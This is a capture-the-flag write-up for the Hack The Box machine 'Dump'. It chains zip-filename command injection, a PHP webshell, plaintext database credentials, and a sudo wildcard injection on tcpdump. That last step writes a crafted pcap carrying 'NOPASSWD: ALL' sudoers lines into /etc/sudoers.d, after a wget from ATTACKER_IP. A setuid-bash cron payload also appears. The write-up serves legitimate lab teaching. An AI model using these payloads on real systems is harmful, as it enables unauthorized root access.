# HTB: Dump Writeup

**Difficulty:** Medium
**OS:** Linux (Debian 11)
**Key Concepts:** Command injection, sudo wildcard abuse, parameter injection, pcap crafting, sudoers parser quirks

---

## Recon

Starting with a basic port scan:

```
nmap -sC -sV 10.129.234.97
```

Only two ports open:
- **22** — SSH (OpenSSH)
- **80** — Apache with PHP

The web app is a simple packet capture tool. You log in, it lets you start a tcpdump capture, and then you can view or download the resulting pcap files. Pretty niche.

---

## Foothold: Zip Command Injection → www-data

Poking around the web app, there's a feature that lets you download captures as a `.zip`. The backend shells out to the `zip` command and the filename parameter isn't sanitized properly. Classic command injection.

By injecting into the filename, we can get code execution as `www-data`. I dropped a simple PHP webshell:

```php
<?php system($_GET['c']); ?>
```

This lands at `/var/www/html/downloads/s.php` and gives us a shell as `www-data`.

---

## Lateral Movement: www-data → fritz (User Flag)

Once on the box, I poked around and found the app's database:

```
/var/www/database/database.sqlite3
```

It's world-readable and stores passwords in **plaintext** (the irony, given the box name references "dumping"). One user stood out:

- **fritz** / `Passw0rdH4shingIsforNoobZ!`

Used `su` to switch to fritz and grabbed the user flag:

```
cat /home/fritz/user.txt
```

> `REDACTED`

Fritz is in the `adm` group, which gives read access to various log files — useful later.

---

## Privilege Escalation: www-data → root

This is where things get interesting. The privesc chain has several layers and a few dead ends before the real path becomes clear.

### What sudo gives us

Running `sudo -l` as www-data shows:

```
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10
    -w/var/cache/captures/*/[UUID]
    -F/var/cache/captures/filter.[UUID]
```

So we can run tcpdump as root, but the arguments are locked down:
- `-c10` — capture exactly 10 packets
- `-w` — output path must be under `/var/cache/captures/*/[UUID]`
- `-F` — filter file must match a UUID pattern

The `*` wildcard and the UUID character classes `[0-9a-f]` are the only wiggle room.

### Dead end: /etc/cron.d (the trap)

My first idea was to use a TOCTOU (time-of-check-time-of-use) race condition. tcpdump runs as root, creates the output file, then `chown`s it to the `tcpdump` user. By rapidly toggling a symlink between a decoy directory and `/etc/cron.d/`, you can win the race — the file gets created in the target directory but the chown hits the decoy, leaving a **root-owned** file in `/etc/cron.d/`.

The race worked perfectly. I embedded a crontab payload in UDP packets:

```
* * * * * root chmod u+s /bin/bash
```

tcpdump captured the packets and wrote a root-owned pcap to `/etc/cron.d/`. Victory, right?

**Nope.** Vixie cron (the cron implementation on Debian) is brutally strict. It parses cron files line by line, and the **first syntax error causes it to reject the entire file**. Since a pcap starts with a binary magic header (`0xd4c3b2a1`), the very first "line" is garbage. Cron logs told the story:

```
Error: bad minute; while reading /etc/cron.d/28960350-...
(*system*28960350-...) ERROR (Syntax error, this crontab file will be ignored)
```

The file is structurally a pcap with our crontab line buried inside. Cron doesn't care about the valid line — the binary preamble kills the whole file. Dead end.

### The real path: sudo wildcard parameter injection → /etc/sudoers.d/

The key insight is that sudo's wildcard matching is more permissive than you'd expect. When the sudoers rule contains wildcards, sudo concatenates the entire command into a single string and uses `fnmatch()` to match it. Critically, `*` matches **any characters including spaces**, which means it can match across argument boundaries.

The sudoers rule pattern:
```
/usr/bin/tcpdump -c10 -w/var/cache/captures/*/[UUID] -F/var/cache/captures/filter.[UUID]
```

What we actually run:
```
sudo /usr/bin/tcpdump -c10 \
  -w/var/cache/captures/x \
  -Z root \
  -r/var/cache/captures/534ce8b9-.../pcap_uuid \
  -w/etc/sudoers.d/output_uuid \
  -F/var/cache/captures/filter.filter_uuid
```

The `*` happily matches `x -Z root -r/var/cache/captures/.../pcap_uuid -w/etc/sudoers.d` because fnmatch doesn't care about spaces or slashes (no `FNM_PATHNAME` flag). The rest of the pattern lines up with our UUID filenames.

This injects three extra flags:
- **`-Z root`** — tells tcpdump to stay running as root instead of dropping privileges. Without this, the output file gets chowned to `tcpdump:tcpdump`, and sudoers.d rejects files not owned by root.
- **`-r`** — read from a pcap file instead of capturing live traffic. This makes the exploit deterministic (no timing issues, no race with the tcpdump-killer script).
- **Second `-w`** — overrides the first `-w`, redirecting output to `/etc/sudoers.d/`. tcpdump uses the last value when a flag is specified twice.

### Crafting the payload pcap

The output file in `/etc/sudoers.d/` will be a pcap, so it's mostly binary garbage. But here's where sudoers differs from cron: **sudo's parser has error recovery built into its yacc grammar**. When it hits a line of binary nonsense, it logs a warning, skips to the next newline, and keeps parsing. If it eventually finds a valid sudoers entry, it applies it.

So the game is to craft a pcap where our sudoers line sits cleanly on its own line (delimited by `0x0a` newline bytes), and the binary headers contain **no accidental newlines** that would break our payload across lines.

I wrote a Python script to build the pcap from scratch:

```python
# Payload embedded in each UDP packet
payload = b"\nwww-data ALL=(ALL:ALL) NOPASSWD: ALL\n"
```

Key design choices:
- **Source/dest IPs**: `192.168.1.1` / `192.168.1.2` — no `0x0a` bytes. (A `10.x.x.x` address would have `0x0a` as its first byte, injecting stray newlines into the binary headers.)
- **Ports**: 12345 / 9999 — no `0x0a` in the two-byte representations
- **Timestamps**: values 100–109 (`0x64`–`0x6d`) — no `0x0a`
- **MAC addresses**: chosen to avoid `0x0a`
- **IP checksum**: calculated to `0xB754` — no `0x0a`

The result: a 984-byte pcap with exactly 20 `0x0a` bytes, all within the UDP payload regions (2 per packet, 10 packets). The sudoers parser sees alternating lines of binary junk (skipped) and valid `www-data ALL=(ALL:ALL) NOPASSWD: ALL` entries (applied).

### Putting it together

```bash
# 1. Upload crafted pcap to the target
wget -O /var/cache/captures/534ce8b9-.../abcdef01-2345-6789-abcd-ef0123456789 \
  http://ATTACKER_IP:8893/sudoers.pcap

# 2. Create a BPF filter file (required by the sudo rule)
echo "udp port 9999" > /var/cache/captures/filter.fedcba98-7654-3210-fedc-ba9876543210

# 3. Run the injected command
sudo /usr/bin/tcpdump -c10 \
  -w/var/cache/captures/x \
  -Z root \
  -r/var/cache/captures/534ce8b9-.../abcdef01-2345-6789-abcd-ef0123456789 \
  -w/etc/sudoers.d/aabbccdd-eeff-1122-3344-556677889900 \
  -F/var/cache/captures/filter.fedcba98-7654-3210-fedc-ba9876543210
```

After running, `sudo -l` confirms the new permissions:

```
/etc/sudoers.d/aabbccdd-...:1:83: unexpected line break in string
/etc/sudoers.d/aabbccdd-...:3:59: unexpected line break in string
... (10 warnings for binary junk lines)

User www-data may run the following commands on dump:
    (ALL : ALL) NOPASSWD: /usr/bin/tcpdump ...
    (ALL : ALL) NOPASSWD: ALL    ← repeated 10 times
```

The warnings are harmless — sudo found the valid entries and applied them. Now:

```bash
sudo cat /root/root.txt
```

> `REDACTED`

---

## Summary

| Step | From | To | Technique |
|------|------|----|-----------|
| Foothold | — | www-data | Zip command injection in web app |
| User | www-data | fritz | Plaintext credentials in SQLite database |
| Root | www-data | root | Sudo wildcard parameter injection + crafted pcap in sudoers.d |

### Why the root exploit works (the short version)

Three things combine:

1. **Sudo's `*` wildcard matches across argument boundaries** — lets us inject `-Z root`, `-r`, and a second `-w` into a locked-down tcpdump command
2. **`-Z root` prevents privilege dropping** — the output file stays owned by root, which sudoers.d requires
3. **Sudo's parser recovers from errors** — unlike cron which rejects files on the first syntax error, sudo's yacc grammar has error productions that skip binary junk and keep parsing until it finds valid entries

The cron.d path was a deliberate trap — it looks like the obvious target for a root-owned pcap, but cron's strict parser makes it a dead end.
